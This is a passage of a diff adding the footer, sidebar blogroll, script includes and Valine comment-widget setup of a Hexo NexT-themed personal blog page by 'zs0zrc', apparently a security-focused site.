+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://myhackerworld.top/" title="D4rk3r" target="_blank">D4rk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://m4x.fun/" title="M4X" target="_blank">M4X</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz',
+        appKey: 'uYeHUkgtbToPh4mGzE7YJXNe',
+        placeholder: 'pwn pwn pwn',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
